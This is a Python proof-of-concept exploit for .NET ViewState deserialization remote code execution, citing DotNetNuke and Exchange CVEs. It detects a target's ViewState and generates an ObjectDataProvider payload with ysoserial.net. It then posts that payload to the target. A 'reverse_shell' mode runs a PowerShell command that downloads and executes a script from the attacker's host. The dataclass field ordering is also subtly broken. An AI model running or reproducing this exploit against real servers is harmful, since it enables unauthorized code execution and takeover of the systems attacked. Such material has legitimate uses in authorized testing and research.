#!/usr/bin/env python3
"""
.NET ViewState Deserialization RCE PoC
CVE: CVE-2017-9248 (DotNetNuke), CVE-2020-0688 (Exchange), others
Target: ASP.NET applications with exploitable ViewState
Vulnerability: Insecure ViewState deserialization → Remote Code Execution

Reference:
- https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/
- https://github.com/pwntester/ysoserial.net

Exploit Flow:
1. Identify ASP.NET application (ViewState in forms)
2. Extract ViewState value and decode
3. Discover or brute-force machine key
4. Generate malicious ViewState using ysoserial.net
5. Submit crafted ViewState to trigger deserialization
6. Achieve RCE via ObjectDataProvider gadget chain
"""

import argparse
import requests
import sys
import base64
import subprocess
import os
from dataclasses import dataclass, field
from typing import Optional
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

@dataclass(slots=True)
class ExploitContext:
    """.NET ViewState exploit configuration and state."""

    target_ip: str
    target_port: int
    protocol: str = "http"
    endpoint: str = "/Default.aspx"

    attacker_ip: str
    attacker_port: int

    machine_key: str = ""  # Optional if known
    validation_key: str = ""
    ysoserial_path: str = "ysoserial.net.exe"
    command_type: str = "ping"
    proxy: Optional[str] = None

    session: requests.Session = field(default_factory=requests.Session, repr=False)
    viewstate_confirmed: bool = field(default=False, repr=False)
    rce_confirmed: bool = field(default=False, repr=False)

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            endpoint=args.endpoint,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            machine_key=args.machine_key,
            validation_key=args.validation_key,
            ysoserial_path=args.ysoserial,
            command_type=args.command,
            proxy=args.proxy,
        )

    def get_base_url(self) -> str:
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_target_url(self) -> str:
        return f"{self.get_base_url()}{self.endpoint}"

    def get_proxies(self) -> Optional[dict]:
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=".NET ViewState Deserialization RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target_group = parser.add_argument_group("Target Configuration")
    target_group.add_argument("target_ip", help="Target IP address")
    target_group.add_argument("target_port", type=int, help="Target port")
    target_group.add_argument("--endpoint", default="/Default.aspx", help="ASP.NET page (default: /Default.aspx)")

    attacker_group = parser.add_argument_group("Attacker Configuration")
    attacker_group.add_argument("listening_ip", help="Attacker IP")
    attacker_group.add_argument("listening_port", type=int, help="Attacker port")

    exploit_group = parser.add_argument_group("Exploit Configuration")
    exploit_group.add_argument("--machine-key", default="", help="Machine key (if known)")
    exploit_group.add_argument("--validation-key", default="", help="Validation key (if known)")
    exploit_group.add_argument("--ysoserial", default="ysoserial.net.exe", help="Path to ysoserial.net")
    exploit_group.add_argument("--command", choices=["ping", "reverse_shell"], default="ping")

    optional_group = parser.add_argument_group("Optional")
    optional_group.add_argument("--proxy", help="HTTP proxy")

    return parser.parse_args()

def stage_recon(ctx: ExploitContext) -> bool:
    print("\n[*] Stage 1: Reconnaissance")

    try:
        response = ctx.session.get(ctx.get_target_url(), proxies=ctx.get_proxies(), timeout=10, verify=False)
        print(f"[+] Target is reachable (HTTP {response.status_code})")

        if "__VIEWSTATE" in response.text:
            print("[+] ASP.NET ViewState detected!")
            # Extract ViewState
            import re
            match = re.search(r'id="__VIEWSTATE" value="([^"]+)"', response.text)
            if match:
                viewstate = match.group(1)
                print(f"[*] ViewState length: {len(viewstate)} chars")
                print(f"[*] ViewState preview: {viewstate[:80]}...")
                ctx.viewstate_confirmed = True
        else:
            print("[!] No ViewState found - may not be ASP.NET or ViewState disabled")

        return True
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return False

def generate_payload(ctx: ExploitContext) -> Optional[str]:
    print("\n[*] Stage 2: Payload Generation")

    if not ctx.machine_key:
        print("[!] Machine key required for exploitation")
        print("[!] Try: --machine-key <KEY> --validation-key <KEY>")
        print("[!] Or use ysoserial.net with known keys")
        return None

    cmd = f"ping -n 4 {ctx.attacker_ip}" if ctx.command_type == "ping" else f"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://{ctx.attacker_ip}:{ctx.attacker_port}/shell.ps1')"

    print(f"[*] Generating ViewState payload with ysoserial.net")
    print(f"[*] Command: {cmd}")

    try:
        result = subprocess.run([
            ctx.ysoserial_path, "-p", "ViewState",
            "-g", "ObjectDataProvider",
            "-c", cmd,
            "--decryptionalg=AES",
            "--decryptionkey=" + ctx.machine_key,
            "--validationalg=SHA1",
            "--validationkey=" + ctx.validation_key
        ], capture_output=True, timeout=10)

        if result.returncode == 0:
            payload = result.stdout.decode().strip()
            print(f"[+] Payload generated ({len(payload)} bytes)")
            return payload
        else:
            print(f"[-] ysoserial.net failed: {result.stderr.decode()}")
            return None
    except Exception as e:
        print(f"[-] Payload generation failed: {e}")
        return None

def stage_exploit(ctx: ExploitContext, payload: str) -> bool:
    print("\n[*] Stage 3: Exploitation")

    data = {"__VIEWSTATE": payload}

    try:
        response = ctx.session.post(
            ctx.get_target_url(),
            data=data,
            proxies=ctx.get_proxies(),
            timeout=15,
            verify=False
        )
        print(f"[+] Payload delivered (HTTP {response.status_code})")

        if "error" in response.text.lower() or "exception" in response.text.lower():
            print("[!] Error detected in response - may indicate deserialization")

        return True
    except Exception as e:
        print(f"[-] Exploitation failed: {e}")
        return False

def main():
    print("[+] .NET ViewState Deserialization RCE PoC")

    args = parse_args()
    ctx = ExploitContext.from_args(args)

    try:
        if not stage_recon(ctx):
            sys.exit(1)

        payload = generate_payload(ctx)
        if not payload:
            sys.exit(1)

        if not stage_exploit(ctx, payload):
            sys.exit(1)

        print("\n[+] Exploitation completed")
        print(f"[!] Check for ping callbacks from {ctx.target_ip}")

    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)

if __name__ == "__main__":
    main()
